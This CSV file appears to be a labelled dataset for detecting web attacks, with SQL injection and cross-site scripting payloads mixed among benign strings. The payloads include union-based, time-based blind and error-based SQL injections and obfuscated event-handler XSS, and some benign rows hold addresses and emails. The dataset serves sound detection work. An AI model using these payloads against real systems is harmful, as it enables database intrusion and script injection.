index,payload,type
2558,-6423'  )   or 6872  =  6872,sqli
16736,"<div draggable=""true"" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>",xss
20167,"<title onmousemove=""alert(1)"">test</title>",xss
11897,3.07E+15,benign
12638,morcn,benign
17635,"<i onmouseenter=""alert(1)"">test</i>",xss
16793,"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>",xss
12506,6180,benign
204," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",sqli
13965,17861,benign
2597,"1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
3874,1'||  (  select 'pmpd' where 9803  =  9803,sqli
17825,"<ins onmouseleave=""alert(1)"">test</ins>",xss
18231,"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",xss
13645,45591,benign
482," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",sqli
19968,"<template onmousedown=""alert(1)"">test</template>",xss
1062,-1603'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'abmo'  =  'abmo,sqli
12550,2.78E+15,benign
1547,"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",sqli
18688,"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></samp>",xss
2757,select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,sqli
12909,2.41E+15,benign
19953,<template id=x tabindex=1 onfocus=alert(1)></template>,xss
1201,"-3349   )    )     )   union all select 6553,6553#",sqli
1520,"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,sqli
19267,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",xss
16859,"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",xss
20153,"<title onbeforepaste=""alert(1)"" contenteditable>test</title>",xss
17129,<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,xss
19924,"<td onbeforecut=""alert(1)"" contenteditable>test</td>",xss
20446,"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>",xss
13039,aldeano,benign
20048,"<th draggable=""true"" ondragstart=""alert(1)"">test</th>",xss
16386,"<command onmouseout=""alert(1)"">test</command>",xss
20519,<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,xss
13680,16806738v,benign
357,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,sqli
16586,"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",xss
1770,"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",sqli
14278,5.83E+15,benign
3057,"-4148%""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""%""  =  """,sqli
3761,"-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --",sqli
20357,"<var onmouseenter=""alert(1)"">test</var>",xss
2222,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",sqli
20175,"<tr draggable=""true"" ondragleave=""alert(1)"">test</tr>",xss
18142,"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",xss
15818,"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",xss
925,"iif  (  7889  =  5114,1,1/0  )  ",sqli
16486,"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",xss
11854,mohandas,benign
19345,"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onanimationend=""alert(1)""></colgroup>",xss
3780,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",sqli
3766,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",sqli
17399,"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",xss
16804,"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>",xss
1935,"-4546'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",sqli
20060,"<th oncontextmenu=""alert(1)"">test</th>",xss
15906,<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,xss
2342,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",sqli
13660,weintraub,benign
18189,"<samp onmouseout=""alert(1)"">test</samp>",xss
17269,"<font oncut=""alert(1)"" contenteditable>test</font>",xss
14062,lima9za,benign
16270,<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>,xss
12698,extremosa,benign
12486,38350,benign
12977,"pl. san marcos, 0, 11f",benign
20322,"<ul onkeypress=""alert(1)"" contenteditable>test</ul>",xss
20145,<title id=x tabindex=1 onactivate=alert(1)></title>,xss
12439,shih_brusse@professionalhost.jp,benign
17468,"<head oncut=""alert(1)"" contenteditable>test</head>",xss
19286,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ul id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ul>",xss
16234,"<cite draggable=""true"" ondragstart=""alert(1)"">test</cite>",xss
13336,777t1c4rio,benign
1975,"1""   )    )     )   and 7153  =  7474--",sqli
3950,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
13967,educativa,benign
13510,coderch gordo,benign
20128,<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,xss
1385,"1"" union all select null,null,null,null--",sqli
20870,<%,xss
19863,"<table onclick=""alert(1)"">test</table>",xss
19501,"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",xss
16439,"<data oncopy=""alert(1)"" contenteditable>test</data>",xss
13664,37ce,benign
15026,carretera 200 hasta km. 1 barra de mio 175,benign
3772,"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",sqli
707, UNION ALL SELECT,sqli
18104,<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,xss
3588,"1%"" and 5411  =  7697 and ""%""  =  """,sqli
3090,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,sqli
19610,"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",xss
19315,"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",xss
3832,"1%""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
13181,gayol,benign
1876,"1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
15921,"<bgsound onmousedown=""alert(1)"">test</bgsound>",xss
16440,"<data oncut=""alert(1)"" contenteditable>test</data>",xss
773,admin' or '1'  =  '1'/*,sqli
13199,"calle las artes, 90,",benign
19263,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></spacer>",xss
11848,5.96E+15,benign
18650,"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",xss
17133,"<embed onbeforecut=""alert(1)"" contenteditable>test</embed>",xss
15351,<x%0Conxxx=1 ,xss
14760,blanquer,benign
2171,"1'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
16626,"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",xss
2329,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,sqli
16408,"<content oncut=""alert(1)"" contenteditable>test</content>",xss
12936,07608453f,benign
1883,"1""  )   order by 1--",sqli
3626,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",sqli
14823,tripicallero,benign
17580,"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",xss
20323,"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",xss
14266,sanabria,benign
20026,<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>,xss
12014,xtiva,benign
15438,"<a draggable=""true"" ondrag=""alert(1)"">test</a>",xss
19041,"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",xss
963,1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,sqli
16352,"<colgroup onmouseleave=""alert(1)"">test</colgroup>",xss
2684,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix",sqli
19121,"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",xss
11385,balsam-prey@mmo.com.cat,benign
19245,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></plaintext>",xss
20058,<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>,xss
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",sqli
20424,"<wbr onbeforecut=""alert(1)"" contenteditable>test</wbr>",xss
20562,<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
13423,1984,benign
1846,"1""  )   as fkgs where 5948  =  5948 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
16514,"<dd onmouseout=""alert(1)"">test</dd>",xss
14146,esbarar,benign
1289,1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,sqli
11731,leonel,benign
14634,3.33E+15,benign
18652,"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></li>",xss
11786,claudio,benign
19623,"<summary oncontextmenu=""alert(1)"">test</summary>",xss
20188,"<tr oncontextmenu=""alert(1)"">test</tr>",xss
17146,"<embed onmouseenter=""alert(1)"">test</embed>",xss
17588,<html id=x tabindex=1 onfocusin=alert(1)></html>,xss
1138,"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,sqli
16416,"<content onmouseleave=""alert(1)"">test</content>",xss
3998,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",sqli
2234,"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
16866,"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>",xss
13886,aulakh,benign
12846,calle rafael bravo gomez 179 5?h,benign
1403,"iif  (  9190  =  5059,1,1/0  )  ",sqli
380," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",sqli
12377,94046799y,benign
18334,<slot id=x tabindex=1 onfocus=alert(1)></slot>,xss
3580,-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,sqli
1114,"-2319 union all select 5068,5068,5068#",sqli
17107,"<em oncut=""alert(1)"" contenteditable>test</em>",xss
15434,navigator.vibrate(500),xss
17458,<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>,xss
18579,"<style onmouseover=""alert(1)"">test</style>",xss
15857,"<bdi onmousedown=""alert(1)"">test</bdi>",xss
332,‘ or 3  =  3 --,sqli
15279,trobos 39 4e,benign
20646,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
14160,castilla s/n,benign
14994,kamber@weat.gd,benign
16958,"<div draggable=""true"" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>",xss
1931,"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ",sqli
19251,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rt>",xss
2560,"1""  )   as zovk where 4591  =  4591 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",sqli
20196,"<tr onmousedown=""alert(1)"">test</tr>",xss
19304,"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationstart=""alert(1)""></article>",xss
20085,<thead id=x tabindex=1 onfocus=alert(1)></thead>,xss
11510,mallo etchart,benign
1818,-6144'  )   or 9385  =  2474--,sqli
18828,"<style>:target {color:red;}</style><s id=x style=""transition:color 1s"" ontransitionend=alert(1)></s>",xss
3810,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",sqli
15829,"<basefont onmouseout=""alert(1)"">test</basefont>",xss
17888,"<pre onclick=""alert(1)"">test</pre>",xss
1288,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
3253,"1""  )   where 9499  =  9499",sqli
19042,"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",xss
20502,"<script>alert(document.head.innerHTML.substr(146,20));</script>",xss
13546,49180,benign
14077,7016,benign
984,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",sqli
17326,"<form onbeforecopy=""alert(1)"" contenteditable>test</form>",xss
19007,"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",xss
20722,"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",xss
19569,"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationend=""alert(1)""></wbr>",xss
603," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",sqli
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",sqli
14696,barnett@micaelagriga.mw,benign
